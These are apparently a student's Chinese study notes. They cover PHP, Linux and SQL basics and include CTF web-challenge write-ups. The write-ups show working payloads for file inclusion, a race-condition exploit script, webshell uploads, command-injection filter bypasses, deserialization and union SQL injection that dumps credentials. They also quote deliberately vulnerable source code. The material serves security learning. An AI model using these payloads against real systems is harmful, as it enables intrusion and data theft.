## PHP

+ PHP str_word_count() 函数对字符串中的单词进行计数：

```php
<?php
echo str_word_count("Hello world!"); // 输出 2
?>
```

Strrev :反转字符串

 echo strlen("")

Strlen :字符的长度

tr_replace() 函数用一些字符串替换字符串中的另一些字符。

```php
<?php
echo str_replace("world", "Kitty", "Hello world!"); // 输出 Hello Kitty!
?>
```

Var_dump() : 显示属性

+ 运算符

  .串接

  .=串接赋值

```php
<?php
$a = "Hello";
$b = $a . " world!";
echo $b; // 输出 Hello world!

$x="Hello";
$x .= " world!";
echo $x; // 输出 Hello world!
?>
```

+ ==while循环==

  ```php
  do {
    要执行的代码;
  } while (条件为真);
  ```

​       do while 循环至少会执行一次语句（即使是错的）



+ ==for循环==

  foreach只用于数组

  ```php
  <?php 
  $colors = array("red","green","blue","yellow"); 
  
  foreach ($colors as $value) {
    echo "$value <br>";
  }
  ?>
  ```

​       结果：red；green；blue；yellow

+  ==函数==

  以function开头，（$fname)为参数。

  可定义参数 echo "$fname  ##" 

  familyname（''**'')

结果为**##

返回值用return

```php
function sum($x,$y)

{$z=x+y;
return $z}
echo "5 + 10 = " . sum(5,10) . "<br>";

```

结果：5+10=15

+ ==数组==

  array() 函数用于创建数组

  count() 函数用于返回数组的长度（元素数）

  ```php
  $age=array("Bill"=>"35")
  $age['Bill']="35";
  ```

```php
<?php
$age=array("Bill"=>"63","Steve"=>"56","Elon"=>"47");

foreach($age as $x=>$x_value) {
  echo "Key=" . $x . ", Value=" . $x_value;
  echo "<br>";
}
?>
```

+ ==数组排序==
  - sort() - 以升序对数组排序
  - rsort() - 以降序对数组排序
  - asort() - 根据值，以升序对关联数组进行排序
  - ksort() - 根据键，以升序对关联数组进行排序
  - arsort() - 根据值，以降序对关联数组进行排序
  - krsort() - 根据键，以降序对关联数组进行排序

+ ==超全局==

​        $GLOBALS  引用全局作用域中可用的全部变量

​        $_SERVER  保存关于报头、路径和脚本位置的信息。

​        $_REQUEST 收集 HTML 表单提交的数据。

​        $_POST 收集提交 method="post" 的 HTML 表单后的表单数据

​        $_GET 

​        也可用于收集提交 HTML 表单 (method="get") 之后的表单数据, 也可以收集 URL 中的发送的数据。

​        $_FILES

​        $_ENV

​        $_COOKIE

​        $_SESSION

+ ==php 文件==

  r打开文件为只读。文件指针在文件的开头开始。

  w打开文件为只写。删除文件的内容或创建一个新的文件，如果它不存在。文件指针在文件的开头开始。

  a打开文件为只写。文件中的现有数据会被保留。文件指针在文件结尾开始。创建新的文件，如果文件不存在。

  x创建新文件为只写。返回 FALSE 和错误，如果文件已存在。

  r+打开文件为读/写、文件指针在文件开头开始。

  w+打开文件为读/写。删除文件内容或创建新文件，如果它不存在。文件指针在文件开头开始。

  a+打开文件为读/写。文件中已有的数据会被保留。文件指针在文件结尾开始。创建新文件，如果它不存在。x+创建新文件为读/写。返回 FALSE 和错误，如果文件已存在。



## Linux



+ 只有一个根目录

  bin->user/bin 系统的可执行文件，可在任何目录执行.

​        usr/local/bin 用户自己的可执行文件，可在任何目录执行.

​        etc 存放配置文件，配置环境变量.

​        home 用户的根目录.

​        opt 存放额外安装的软件.相当于Windows的 program files目录.

+ clear 清屏

​        uname-a 查看内核信息

​        whoami 用户

​        pwd 地址

​        who 当前登录人数

​        file 当前命令类型







## kali

+ sudo以root身份运行

+ dpkg -i安装deb程序包

+ ls -a查看隐藏文件

+ ls 显示目录与文件信息

+ cd 切换当前工作目录

+ vim 文档编辑器

+ ifconfig 显示或配置网络设备（网络接口卡）

+ cat 查看文件内容

+ service * start/stop/status 查看服务启停状态

+ adduser 创建用户

+ passwd 设置/更改密码

+ pwd 显示当前工作目录

+ df -h 是显示当前文件系统的空间使用情况

+ top 查看系统的整体运行情况

+ free -m 显示的当前内存的使用

+ apt-get 安装了那些软件包

+ date 查询系统时间

+ kill 用来删除执行中的程序或工作

+ rm 删除文件或目录

+ mv 移动文件或目录

+ cp -r 复制文件与目录

+ netstat 显示Linux中网络系统的状态信息







## 【Web Level1】张Sir_include_丁真

+ 提交几个后，发现地址栏中[121.43.55.52:10075/?file=include%2Ffile2.php&submit=提交](http://121.43.55.52:10075/?file=include%2Ffile2.php&submit=提交)

include%2file2 发生变化。

猜想flag藏在其中，改为Fflag。

- 本地文件包含

which dingzhen do you like?

​                 --------------                 original dingzhen                 yiyuan dingzhen                 yiyan dingzhen                 c dingzhen                 Eyan dingzhen              

Ohhhhhh you find my secret !
flag is here,try to find it
press F12 to get hint

按照指示，跳转页面。

+ 利用伪协议 ?file=php://filter/read=convert.base64-encode/resource=index.php（/read=convert.base64-encode/表示对读取数据进行base64编码）

  得到base编码，通过在线解码，得出flag。

## 【Web Level 1】easy include

+ 假设代码审计中遇到file_get_contents()函数，由于该函数的对象是数据流，需要读取文件，我们将file_get_contents()的对象赋值为“php://input”，从而将对象转为读取的数据，此时可以用post将file_get_contents()的对象赋值成需要的值，或执行需要的的php代码

+ if(isset($a)&&(file_get_contents($a,'r')) === 'an easy include')

    include("flag.php");
    echo($flag);

  + 可知需要输入an easy include到文件a中才能得到flag

+ 通过burp抓包后改为post格式

  添加以下几点

  POST /?a=php://input HTTP/1.1



​        an easy include

在repeater中send，可在response中得到flag



## 【Web Level3】EZ_require_once

* 发现题目中有两个require_once 

### php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经，已经include的文件不可以再require_once。`require_once('flag.php')`

所以要想解出则必须要绕过require_once（）

+ 指向当前进程的，是指向的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过，payload：`/proc/self``/proc/pid/``/proc/self/root/``/`

可用其构造payload方便绕过require_once（）

+ php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html//flag.php

+ 利用火狐的hackerbar与伪协议绕过require_once

  http://121.43.55.52:10027/?fi_le=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root//flag.php

  得到PD9waHANCiRGTEFHID0gImZsYWd7ZDQzNmViMC1kOWRlMTBiNS1hODI4Y2U2NDMtZjdlODF9Ijs=

+ 利用base64在线解码得到flag















## 【Web Level1】ez_upload

+ 文件上传发现只能上传图片则，写一句话木马，改为图片形式。
+ 利用burp抓包，将格式改为php绕过，在burp中发送。
+ 获得地址后，利用蚁剑连接，在根目录中找到flag。



## 【Web Level2】EZ_upload-js

+ 文件上传发现只能上传图片则，写一句话木马，改为图片形式。
+ 利用burp抓包，将格式改为php绕过，在burp中发送。
+ 获得地址后，利用蚁剑连接，在根目录中找到flag。





## 【Web level1】No Antsword



+ 直接在网址后面加上flag.php就可得出







## 【web 】level 2 upload



+ 黑名单过滤掉了为以下后缀的文件，会自动置空符合的字段。可以改木马文件后缀进行绕过黑名单。

+ .html，.pphphp，因为win对于大小写的不敏感，也可以改为.PHP，.PhP等等。

+ 便尝试将后缀改为.pphphp，即使可以过滤一个php，还会上传。
+ 用蚁剑可以连接上，在根目录中得到结果





## 【Web Level2】EZ_UPLOAD

+ 发现只有.jpg可以上传，用之前的蚁剑也连接不上。
+ 在尝试中发现.php.jpg可以上传，发现是黑名单绕过。
+ 在网上查询得知，可以用.htaccess绕过，在上传脚本后，将php改为jpg上传了。
+ 再用蚁剑连接得出结果。





## 【Web Level4】EZ_LFI_complete

+ 利用文件包含中的session包含和条件竞争

1.如果session.auto_start=On ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。
但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=flag，PHP将会在服务器上创建一个文件：/tmp/sess_flag”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。
2.但是，默认配置session.upload_progress.cleanup = on导致文件上传后，session文件内容立即清空,所以我们可以利用多线程进行条件竞争------通俗的说：在还没有删掉之前 用另一线程的脚本把 命令执行了

原文链接：https://blog.csdn.net/qq_53755216/article/details/116031608

+ 大佬的脚本

import io#io库

import requests#requests库

import threading#多线程库

url = 'http://121.43.55.52:10001/'

def write(session):

  data = {

​    'PHP_SESSION_UPLOAD_PROGRESS':'<?php system("tac /f*");?>dotast'

  }#构造数据，有个特殊字符dotast，这个用来判断响应包是否是我们想要的

  while True:#循环着，进行条件竞争

​    f = io.BytesIO(b'a'*1024*10)

​    response = session.post(url,cookies={'PHPSESSID':'flag'},data=data,files={'file':('dota.txt',f)})

\#

def read(session):

  while True:#持续的读入text，直至成功

​    response = session.get(url+"?file=/tmp/sess_flag")#以get访问该临时文件

​    if 'dotast' in response.text:#如果出现该特殊字符

​      print(response.text)#说明成功竞争到资源

​      break#结束程序

​    else:

​      print("NO")#没有成功

if __name__=='__main__':

  session = requests.session()

  write = threading.Thread(target=write,args=(session,))#开启多线程竞争

  write.daemon = True#这个的意思就是主线程结束，子线程也跟着结束了

  write.start()#开始多线程运行

  read(session)#读入text

+ 得到flag upload_progress_$FLAG = "flag{d2131d-d9de213b5-a996ce643-f9991}";





## 【Web level5】A_Good_Pear

+ 根据提示打开[Docker PHP裸文件本地包含综述 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html)
+ 根据代码及提示，需要用data伪协议去绕过第一层waf后再绕第二层。

第一眼就看到config-create，阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。

GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1 Host: 192.168.1.162:8080 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Connection: close

![img](file:///D:\OneDrive\文档\Tencent Files\1339071002\Image\C2C\9F42B076052C613BC63AC2966689260C.jpg)

再用蚁剑连接![img](file:///D:\OneDrive\文档\Tencent Files\1339071002\Image\C2C\59A0FEA04259A922D8F6850A7532A3C1.jpg)

在根目录里找到flag![img](file:///D:\OneDrive\文档\Tencent Files\1339071002\Image\C2C\6C759A48540C0E25D8E2042C70779CAB.jpg)

​     

## 【Level1】张sir的远程命令执行

+ 输入127.0.0.1&ls 或ls 读取本地文件

得到 flag.php index.php

+ 尝试输入cat flag.php 以及cat index.php发现都出错了

+ 输入more flag.php在源代码里得到

  <!--百度是个好东西！试试百度一下RCE吧！--!>
  </body>
  <html>

  ::::::::::::::
  flag.php
  ::::::::::::::
  <?php
  //flag{6aa1fb7e-09bb-47f6-b940-f6a763e542a9}

+ 感觉过滤了cat，那输入tac flag.php或其他方式例如c\at flag.php

  成功得到flag

  //flag{6aa1fb7e-09bb-47f6-b940-f6a763e542a9}

## 【level 1】so easy rce

+ 打开题目后发现需要传参可以利用hackbar，也可以在地址栏输入?cmd=system("ls")

  得到index.php

+ 输入?cmd=system("ls /")得到bin dev etc flag.txt home lib media mnt opt proc root run sbin srv sys tmp usr var

+ 输入121.43.55.52:10057/?cmd=system("cat /flag.txt")；

得到

flag{this--is_the_flag}

## 【Level2】张神的远程命令执行

+ 输入ls 得到

  flag.php index.php

+ 输入cat flag.php

   得到hacker! no space!过滤了空格

  绕过空格的方式

  ${IFS}$9
  {IFS}
  $IFS
  ${IFS}
  $IFS$1 //$1改成$加其他数字貌似都行
  IFS
  < 
  <> 
  {cat,flag.php}  //用逗号实现了空格功能，需要用{}括起来
  %20   (space)
  %09   (tab)
  X=$'cat\x09./flag.php';$X       （\x09表示tab，也可以用\x20）
  
+ 输入cat${IFS}flag.php 

  得到1hacker! no symbol!发现过滤了{}

+ 输入cat$IFS$1flag.php

  得到hacker! no flag!

可知不能读flag那便读cat$IFS$1index.php

|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $command, $match)){ echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $command, $match); die("hacker! no symbol!"); } else if(preg_match("/ /", $command)){ die("hacker! no space!"); } else if(preg_match("/bash/", $command)){ die("hacker! no bash!"); } else if(preg_match("/.*f.*l.*a.*g.*/", $command)){ die("hacker! no flag!"); } $a=shell_exec($command); print_r($a); }

+ 可知过滤了flag

  利用拼接法绕过，a=g;cat$IFS$1fla$a.php 根据提示在控制台中得到flag

flag{0128e169-7c82-496d-84ce-d863c0bfa614}





## 【Web level3】EZ_RCE

+ 由题意可知，该题的提交被hidden隐藏起来了，我们可以通过修改源代码来改变，但是只能利用提交一次，不如直接回车提交。

+ 看源代码显示参数是code，而且改题目是无子母rce。则不能利用平常的传参方式。

+ 可以用字符异或代替GET传参。

  在PHP中，两个变量进行异或时，先会将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异

  或，异或完，又将结果从二进制转换成了ASCII值，再将ASCII值转换成字符串。                                                    

+ 首先需要构造GET 

  脚本

def encode(command):

  code = "~`!@#$%&*()-=+_[]{};:<>,.?/|"

  result_1 = ""

  result_2 = ""

 

  for x in command:

​    if not command.isalpha():

​      result_1 += x

​      result_2 += x

​    for y in code:

​      if chr(ord(x) ^ ord(y)) in code:

​        result_1 += y

​        result_2 += chr(ord(x) ^ ord(y))

​        break

  return f'("{result_1}" ^ "{result_2}")' 

 

a=encode('G')

print(a)

得到code=$_=("$"^"{").("{"^"<").("{"^">").("}"^";${$_}[_](${$_}[__]);&_=system&__=ls )

尝试(http://121.43.55.52:10001/index.php?code=$_=("$"^"{").("{"^"<").("{"^">").("}"^";${$_}[_](${$_}[__]);&_=system&__=ls /)

得到bin dev etc flag.txt home lib media mnt opt proc root run sbin srv sys tmp usr var

[](http://121.43.55.52:10001/index.php?code=$_=("$"^"{").("{"^"<").("{"^">").("}"^")");${$_}[_](${$_}[__]);&_=system&__=cat /flag.txt)

flag{41d4d-42d20e-ec725981a30-61c1cd6}



## 【Level2】听说碇真嗣的博客很好看

+ 在碇真嗣的博客中有讲解

+ 我们可以从博客中了解4个\定义一个\可知第一层的waf绕过为

http://121.43.55.52:10061/?y1=\\/Iwantflag

The first waf was passed!
array(1) { [0]=> string(12) "\\/Iwantflag" }
Do you like md5?

+ 第二层为

  The first waf was passed!
  array(1) { [0]=> string(12) "\\/Iwantflag" }
  Do you like md5?

md5碰撞弱碰撞

s1091221200a

md5解码后为0e开头则百度搜一个

MMHUWUV 0e701732711630150438129209816536

令a=MMHUWUV

得The second waf was passed!

+ 第三层

由于md5函数无法处理数组,会返回null

则随便令b和c为任意不等数组

[121.43.55.52:10061/?y1=\\/Iwantflag&a=MMHUWUV&b[\]=1&c[]=2](http://121.43.55.52:10061/?y1=\\/Iwantflag&a=MMHUWUV&b[]=1&c[]=2)

The third waf was passed!

利用为协议绕过

?a=php://filter/read=convert.base64-encode/resource=xxx.php

且注释中有flag is in flag.php 

![img](file:///D:\OneDrive\文档\Tencent Files\1339071002\Image\C2C\918CCAA8F659F25B63D8533A95C31BA9.jpg)

解码得到flag



## 【Web level5】组合拳😈



前面绕过与Level2】听说碇真嗣的博客很好看一样

在源码中发现👜👤👘👥👦👥🐥👧👟👧

Base100解码得到emanon.php

http://121.43.55.52:10098/?y1=\\/Iwantflag&a=MMHUWUV&b[]=1&c[]=2 三层绕过后读源码

flag=php://filter/read=convert.base64-encode/resource=emanon.php

PD9waHANCmVycm9yX3JlcG9ydGluZyhFX0VSUk9SKTsNCmluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiT2ZmIik7DQokaHRtbD08PDxIVE0NCjwhRE9DVFlQRSBodG1sPg0KPGh0bWw+DQo8Ym9keT4NCiAgICA8aW1nIHNyYyA9ICIuL2xxaC5qcGciIGFsdD0i55S35ZCMIiB3aWR0aD0iNDAwIiBoZWlnaHQ9IjIwMCI+DQo8L2JvZHk+DQo8L2h0bWw+DQpIVE07DQplY2hvICRodG1sOw0KZWNobygiPC9icj4iKTsNCmVjaG8gKCI1b2lSYkhGbzVwaXY1TGl0NVp1OTVaQ001b0NuNW9HTDU2eXM1TGlBNUxxNiIpOw0KaWYoIXByZWdfbWF0Y2goJy9iYXNofHB5dGhvbnxwaHB8c2h8bmN8cm18ZWNob3xiYXNlfGNhdHxscy9pJywkX0dFVFsnY21kJ10pKXsNCiAgICBAc2hlbGxfZXhlYygkX0dFVFsnY21kJ10pOw0KfWVsc2V7DQogICAgZGllKCLlk6Xlk6XkuI3opoEiKTsNCn0NCg==



```
<?php

error_reporting(E_ERROR);

ini_set("display_errors","Off");

$html=<<<HTM

<!DOCTYPE html>


<html>

<body>

​    <img src = "./lqh.jpg" alt="男同" width="400" height="200">

</body>

</html>

HTM;

echo $html;

echo("</br>");

echo ("5oiRbHFo5piv5Lit5Zu95ZCM5oCn5oGL56ys5LiA5Lq6");

if(!preg_match('/bash|python|php|sh|nc|rm|echo|base|cat|ls/i',$_GET['cmd'])){

  @shell_exec($_GET['cmd']);

}else{

  die("哥哥不要");

}
```



+ 可看出需要传参cmd才能继续
+ 利用重定向符

 [121.43.55.52:10034/emanon.php?cmd=l\s />> /var/www/html/y2

[121.43.55.52:10034/y2](http://121.43.55.52:10034/y2)

```
bin
boot
dev
etc
f1l4g
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

发现flag在利用*读取所有文件

[121.43.55.52:10026/emanon.php?cmd=ca\t /*>> y3](http://121.43.55.52:10026/emanon.php?cmd=ca\t /*>> y3)

在y3得到flag



## 【level 1】Serialize??

+  页面为

  啊什么情况怎么什么都没有，你猜猜应该看看什么？

  F12查看源代码

```
<!--
$KEY = "skctf_you_got_it";
$str = $_GET['str'];

if (unserialize($str) === "$KEY")
{
    echo "flag";
}
```

观察第一个源代码，要求把str[反序列化](https://so.csdn.net/so/search?q=反序列化&spm=1001.2101.3001.7020)之后 与 KEY相等 才能输出 flag 那么str就得是序列化之后的KEY
即，将KEY的值进行序列化之后，传入即可 得到flag；

<?php    

class test{             

 protected $a = "skctf_you_got_it";          

}   

$test = new test;   //建立一个test的对象；

$data = serialize($test);  //将对象进行序列化；

echo $data; 

?>

序列化得到O:4:"test":1:{s:4:"*a";s:16:"skctf_you_got_it";}

GET传参[121.43.55.52:10098/?str=s:16:"skctf_you_got_it";](http://121.43.55.52:10098/?str=s:16:"skctf_you_got_it";)

 

flag{ushfw_fea_sjkefh_ffoiaf__dfs}



## 【Level4】Hard_inlcude_serialize

+ F12查看源码

+ ```
  <!--
  $user = $_GET["user"];
  $file = $_GET["file"];
  $pass = $_GET["pass"];
  
  if(isset($user)&&(file_get_contents($user,'r')==="im the real admin")){
      echo "you are admin now<br>";
      include($file);
  }else{
      echo "no! you are not admin";
  }
   -->
  ```

需要传参

![img](file:///D:\OneDrive\文档\Tencent Files\1339071002\Image\C2C\88B1F7456CFCE63382B118285E5B23D7.jpg)

然后利用伪协议读index.php源码

![img](file:///D:\OneDrive\文档\Tencent Files\1339071002\Image\C2C\1B9B14CF54B3D19421839F9306EB12FF.jpg)

+ 解码得

+  

  ```
  <?php
  
  error_reporting(0);
  
  $user = $_GET["user"];
  
  $file = $_GET["file"];
  
  $pass = $_GET["pass"];
  
   
  
  if(isset($user)&&(file_get_contents($user,'r')==="im the real admin")){
  
    echo "you are admin now<br>";
  
    if(preg_match("/fllaggg/i",$file)){
  
  ​    echo "no direct flag";
  
  ​    exit();
  
    }else{
  
  ​    include($file); //class.php
  
  ​    $pass = unserialize($pass);
  
  ​    echo $pass;
  
    }
  
  }else{
  
    echo "no! you are not admin";
  
  }
  
   
  
  ?>
  
   
  
  <!--
  
  $user = $_GET["user"];
  
  $file = $_GET["file"];
  
  $pass = $_GET["pass"];
  
   
  
  if(isset($user)&&(file_get_contents($user,'r')==="im the real admin")){
  
    echo "you are admin now<br>";
  
    include($file);
  
  }else{
  
    echo "no! you are not admin";
  
  }
  ```
  
  
  
   可看到 include($file); //class.php

读取class.php

PD9waHANCg0KY2xhc3MgUmVhZHsvL2ZsbGFnZ2cucGhwDQogICAgcHVibGljICRmaWxlOw0KICAgIHB1YmxpYyBmdW5jdGlvbiBfX3RvU3RyaW5nKCl7DQogICAgICAgIGlmKGlzc2V0KCR0aGlzLT5maWxlKSl7DQogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgICAgDQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICJfX3RvU3RyaW5nIHdhcyBjYWxsZWQhIjsNCiAgICB9DQp9DQokcmVhZD1OZXcgUmVhZCgpOw0KJHJlYWQtPmZpbGU9J3BocDovL2ZpbHRlci9yZWFkPWNvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1mbGxhZ2dnLnBocCc7DQplY2hvIHNlcmlhbGl6ZSgkcmVhZCk7DQo/Pg==

解码

```<?php
<?php

 

class Read{//fllaggg.php

  public $file;

  public function __toString(){

​    if(isset($this->file)){

​      echo file_get_contents($this->file);  

​    }

​    return "__toString was called!";

  }

}

$read=New Read();

$read->file='php://filter/read=convert.base64-encode/resource=fllaggg.php';

echo serialize($read);

?>
```

   if(preg_match("/fllaggg/i",$file)){

    echo "no direct flag";
    
    exit();



这个意思是file中如果包含‘fllaggg’，那么就会给你退出。

但是可以得到反序列化得到pass

​    $pass = unserialize($pass);

​    echo $pass;

而在class.php中可以得到$read=New Read();

$read->file='php://filter/read=convert.base64-encode/resource=fllaggg.php';

echo serialize($read);

则pass=php://filter/read=convert.base64-encode/resource=fllaggg.php

![img](file:///D:\OneDrive\文档\Tencent Files\1339071002\Image\C2C\479E9000EC5FC284C297C388356E219B.jpg)

+ 删去最后面的非编码区得到PD9waHAgIA0KLy9mbGFne2Q5MzZlNjUyLWEyNDMtNDNmYy1iOTU4LWI0ZmFmY2VkZjE0M30K

解码得到<?php  
//flag{d936e652-a243-43fc-b958-b4fafcedf143}





PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法，这些都是PHP内置的方法。
__construct 当一个对象创建时被调用
__destruct 当一个对象销毁时被调用
__wakeup() 使用unserialize时触发
__sleep() 使用serialize时触发
__call() 在对象上下文中调用不可访问的方法时触发
__callStatic() 在静态上下文中调用不可访问的方法时触发
__get() 用于从不可访问的属性读取数据
__set() 用于将数据写入不可访问的属性
__isset() 在不可访问的属性上调用isset()或empty()触发
__unset() 在不可访问的属性上使用unset()时触发
__toString() 把类当作字符串使用时触发,返回值需要为字符串
__invoke() 当脚本尝试将对象调用为函数时触发







# SQL

- **SELECT** - 从数据库中提取数据
- **UPDATE** - 更新数据库中的数据
- **DELETE** - 从数据库中删除数据
- **INSERT INTO** - 向数据库中插入新数据
- **CREATE DATABASE** - 创建新数据库
- **ALTER DATABASE** - 修改数据库
- **CREATE TABLE** - 创建新表
- **ALTER TABLE** - 变更（改变）数据库表
- **DROP TABLE** - 删除表
- **CREATE INDEX** - 创建索引（搜索键）
- **DROP INDEX** - 删除SQL UNION 操作符

+ UNION 操作符用于合并两个或多个 SELECT 语句的结果集。

请注意，UNION 内部的每个 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 SELECT 语句中的列的顺序必须相同。

+ 进入关卡内先判断是否存在注入情况，先输入？id =1 and 1=1，发现没有变化，换成and 1=2,依旧没有变化，考虑是为字符型而非整形。

+ 发现为字符型的后先在后面加一个注释符 --+

+ 可以发现正常返回数据。
  此处可以用 order by 对前面的数据进行排列，先进行试数，发现只有三组数据，'order by 3–-+正确.
+ 然后就可以进行[union](https://so.csdn.net/so/search?q=union&spm=1001.2101.3001.7020)联合注入

输入/?id=00' union select 1,2,3--+,首先id得值我们需要随便改一个值，不能用数据库里得值。页面输出了2和3，说明页面有2个显示位。之后输入/?id=00' union select 1,(select database()),3--+—查询本地数据库，信息出现在2的位值。

+  爆表，information_schema.tables表示该数据库下的tables表，点表示下一级。where后面是条件，group_concat()是将查询到结果连接起来。如果不用group_concat查询到的只有user。该语句的意思是查询information_schema数据库下的tables表里面且table_schema字段内容是security的所有table_name的内容。

+ 爆字段名，我们通过sql语句查询知道当前数据库有四个表，根据表名知道可能用户的账户和密码是在users表中。接下来我们就是得到该表下的字段名以及内容。

  该语句的意思是查询information_schema数据库下的columns表里面且table_users字段内容是users的所有column_name的内。注意table_name字段不是只存在于tables表，也是存在columns表中。表示所有字段对应的表名.

  

+ 通过上述操作可以得到两个敏感字段就是username和password,接下来我们就要得到该字段对应的内容。我自己加了一个id可以隔一下账户和密码。

  

  id=-1' union select 1,2,group_concat(username ,id , password) from users--+

  

  

  


## MySQL

+ 联合查询

   1、判断是否存在注入点

  （1）在参数位置修改参数值，eg：id=1修改为2后是否数据改变

  （2）插入单、双引号的检测方法（常用），未闭合的单引号会引起SQL语句单引号未闭合的错误提示

   2、判断注入点还是整形或字符型

  （1）数字型：通过and 1=1

  （2）字符串型：闭合单引号测试语句'and'1'='1进行判断

   3、判断查询列数

  order by 

   4、判断显示位

  报错回显，用不存在的id=-1或0加上union select……

  下面的就都是通过报错后，在显示位构造要查找的信息

   5、获取所有数据库名

   6、获取数据库所有表名

   7、获取字段名

   8、获取字段中的数据



+ 数据库（存数据，管理数据）（DB）

  数据库是所有软件体系最核心的存在。

  关系型数据库(SQL)

  非关系型数据库(NoSQL)

  DBMS(数据库管理系统)

  MySQL是最好的RDBMS之一。

+ **MySQL常用命令**

   - show databases； 查看所有数据库

   - use 数据库名；使用某个数据库

   - show tables； 显示当前选中数据库中的所有表

   - show tables form 数据库名； 显示某数据库中的表（不改变所选中数据库）

   - select database() ；查看所选中的数据库

   - desc 表名； 查看某表的结构

   - select * from 表名； 查看某表的全部记录

   - select version()；查看数据库版本（登陆前：mysql --version/mysql -V）

   - create table 表名( 列名 列类型...)；创建表

     

+ 操作数据库

     1、创建数据库

​                     CREATE DATABASE [IF NOT EXISTS] znb;

​          2、删除数据库

​                      DROP DATABASE [IF EXISTS] znb;

​           3.使用数据库

​                      USE school

​           4.查看数据库

​                       SHOW DATABASES ;查看所有的数据库

+ 数据库的列类型

​           数值  

​              tinyint 十分小的数据 一个字节
​              smallint 较小的数据 ， 两个字节
​              mediumint 中等大小的数据 三个字节
​              int 标准的整数 四个字节
​              big 较大的数据 八个字节
​              float 浮点数 四个字节
​              double 浮点数 八个字节（精度问题）
​              decimal 字符串形式的浮点数 金融计算的时候，一般用decimal
​          字符串

​              char 字符串固定大小 0~255

​              varchar 可变字符串 0~65535** 常用的String

​              tinytext 微形文本 2^8-1

​              text 文本穿 2^16-1

+ DDL

    表操作

​            查看表

​                SHOW TABLES;  （显示当前数据库中的表 ）
​                DESC <表名>; （查看表结构 ）

​             复制表

​               CREATE TABLE 新表名 LIKE 被复制表名； (复制一张表的结构 )
​               CREATE TABLE 新表名 AS ( sql 语句);  (复制一张表结构及内容)

​          修改表 

​               alter table 表名 rename [TO|AS] 新的表名; (重命名表 )
​               alter table 表名 change 旧列名 新列名 类型; ( 修改列名及列类型 )
​               alter table 表名 drop 列名;                (删除一列)
​               alter table 表名 drop primary key;         (删除主键)
​               alter table 表名 add 新增列名 类型;          （ 为表添加一个新列） 
​               alter table 表名 add primary key (字段名);（ 添加一个主键）
​               alter table 表名 modify 列名 类型;         （ 只修改列类型 a）
​               alter table 表名 modify 列名 数据类型 not null; （添加非空约束）
​               alter table 表名 modify 列名 数据类型 not null default 默认值； （添加默认值）

## ssrf

家里面事情有点多，就先写这些吧.

1.17   1.18

+ 主要攻击方式
  - 对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。
  - 攻击运行在内网或本地的应用程序。
  - 对内网Web应用进行指纹识别，识别企业内部的资产信息。
  - 攻击内外网的Web应用，主要是使用HTTP GET请求就可以实现的攻击(比如struts2、SQli等)。
  - 利用file协议读取本地文件等

- 漏洞产生相关函数：

​         （1）file_get_contents() 

​                    

```
<?php
$url = $_GET['url'];;
echo file_get_contents($url);
?>
```

`file_get_content`函数从用户指定的url获取内容，然后指定一个文件名j进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。

（2）fsockopen()



```
<?php 
function GetFile($host,$port,$link) { 
    $fp = fsockopen($host, intval($port), $errno, $errstr, 30);   
    if (!$fp) { 
        echo "$errstr (error number $errno) \n"; 
    } else { 
        $out = "GET $link HTTP/1.1\r\n"; 
        $out .= "Host: $host\r\n"; 
        $out .= "Connection: Close\r\n\r\n"; 
        $out .= "\r\n"; 
        fwrite($fp, $out); 
        $contents=''; 
        while (!feof($fp)) { 
            $contents.= fgets($fp, 1024); 
        } 
        fclose($fp); 
        return $contents; 
    } 
}
?>
```

> `fsockopen`函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限

（3）curl_exec()



```
<?php 
if (isset($_POST['url'])){
    $link = $_POST['url'];
    $curlobj = curl_init();// 创建新的 cURL 资源
    curl_setopt($curlobj, CURLOPT_POST, 0);
    curl_setopt($curlobj,CURLOPT_URL,$link);
    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);// 设置 URL 和相应的选项
    $result=curl_exec($curlobj);// 抓取 URL 并把它传递给浏览器
